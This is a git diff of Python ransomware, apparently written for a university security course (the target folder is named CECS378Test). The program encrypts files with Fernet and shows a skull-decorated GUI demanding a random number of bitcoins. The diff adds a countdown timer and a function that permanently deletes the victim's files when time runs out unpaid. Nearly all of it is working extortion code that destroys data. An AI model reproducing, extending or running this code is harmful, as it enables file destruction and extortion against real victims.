@@ -1,9 +1,8 @@
 import os
-import string
 from tkinter import *
 from tkinter import messagebox
+from datetime import datetime
 from PIL import ImageTk, Image
-import time
 from cryptography.fernet import Fernet
 import random
 
@@ -19,7 +18,6 @@ def generate_file_list_keyword(path):
                 file_name,file_ext = os.path.splitext(root+'\\'+file)
                 if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                         file_paths.append(root+'\\'+file)
-    print(file_paths)
     return file_paths
 
 #Creates a list of files of certain extensions
@@ -31,7 +29,6 @@ def generate_file_list(path):
             file_name,file_ext = os.path.splitext(root+'\\'+file)
             if file_ext in encrypted_ext:
                 file_paths.append(root+'\\'+file)
-    print(file_paths)
     return file_paths
 
 #Creates fernet key
@@ -63,6 +60,8 @@ def encrypt_files(file_paths, fernet):
 #uses fernet key to decrypt all files in file_paths list
 def decrypt_files(file_paths, fernet, key):
     if key_entry.get() == key.decode("utf-8"):
+        global global_status
+        global_status = 'Decrypted'
         for f in file_paths:
             #create decrypted version of the file
             with open(f, 'rb') as enc_file:
@@ -72,7 +71,18 @@ def decrypt_files(file_paths, fernet, key):
             with open(f, 'wb') as dec_file:
                 dec_file.write(decrypted)
 
-# GUI stuff ==========================================================================================================================================================
+        #Removes filekey file from computer after the correct code is used to decrypt all files
+        os.remove(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt')
+        #
+        messagebox.showinfo(title = 'Files Decrypted', message = 'Your files have been decrypted. Thank you for your cooperation. Have a nice day')
+        root.destroy()
+
+#Function to delete all files from the file path from the computer; used if time runs out and user has not sent money.
+def delete_everything(file_paths):
+    for f in file_paths:
+        os.remove(f)
+
+# GUI Stuff / Main Program Loop ==========================================================================================================================================================
 
 #Creates and customizes GUI and is the main process
 root = Tk()
@@ -82,6 +92,7 @@ root.geometry("1280x720")
 root.configure(bg = 'red')
 #Global variable to create the number of bitcoins we want user to send
 how_many_bitcoins_do_we_want = str(random.randint(1,20))
+global_status = 'Running'
 
 #Calls functions to create the file paths of all files to encrypt
 file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
@@ -90,46 +101,30 @@ crypter, key = create_key()
 #Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
 encrypt_files(file_paths, crypter)
 
-hour = StringVar()
-minute = StringVar()
-second = StringVar()
+#Variable math to determine the starting time for the countdown timer
+curr_time = str(datetime.now())
+end_time = str((int(curr_time[11:13]) + 1) % 24) + curr_time[13:19]
+end_time_min = curr_time[11:14] + str((int(curr_time[14:16]) + 1) % 60) + curr_time[16:19]
 
-hour.set('01')
-minute.set('00')
-second.set('00')
+# Countdown Timer Stuff ---------------------------------------------------------------
+def update_time():
+    format = '%H:%M:%S'
+    now = (datetime.now()).strftime(format)
+    string = datetime.strptime(end_time_min, format) - datetime.strptime(now, format)
+    timer.config(text=string)
+    if str(string) != '0:00:00':
+        timer.after(1000,update_time)
+    if str(string) == '0:00:00' and global_status == 'Running':
+        delete_everything(file_paths)
+        messagebox.showinfo(title = 'Files Deleted', message = 'The timer has reached zero, and we have not received any BitCoin from you. Your files have now been permanently deleted. Have a nice day.')
 
-hour_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
-minute_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
-second_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
+#Widget for creating the timer display
+timer = Label(root, font=('Times New Roman', 64,'bold'), bg = 'red', fg = 'white')
+timer.place(x = 500, y = 310)
 
-hour_Text_Box.place(x = 500, y = 310)
-minute_Text_Box.place(x = 600, y = 310)
-second_Text_Box.place(x = 700, y = 310)
-
-# def runTimer():
-#     try:
-#         clockTime = int(hour.get() * 3600) + int(minute.get() * 60) + int(second.get())
-#     except:
-#         print('Incorrect values')
-
-#     while(clockTime > -1):
-#         total_Minutes, total_Seconds = divmod(clockTime, 60)
-
-#         total_Hours = 0
-#         if total_Minutes > 60:
-#             total_Hours, total_Minutes = divmod(total_Minutes, 60)
-        
-#         hour.set('{0:2d}'.format(total_Hours))
-#         minute.set('{0:2d}'.format(total_Minutes))
-#         second.set('{0:2d}'.format(total_Seconds))
-
-#         #root.update()
-#         #time.sleep(1)
-
-#         if clockTime == 0:
-#             messagebox.showinfo('', 'Your time is up. Your files will now be deleted. Have a nice day!')
-        
-#         clockTime -= 1
+#Function to initialize the timer
+update_time()
+# -------------------------------------------------------------------------------------
 
 #Labels for the skull images around the GUI
 skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
@@ -169,7 +164,7 @@ key_button.place(x = 546, y = 540)
 #Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
 messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")
 
-# =================================================================================================================================================================
+# ====================================================================================================================================================================================
 
-# Also GUI
+# Running main program loop
 root.mainloop()
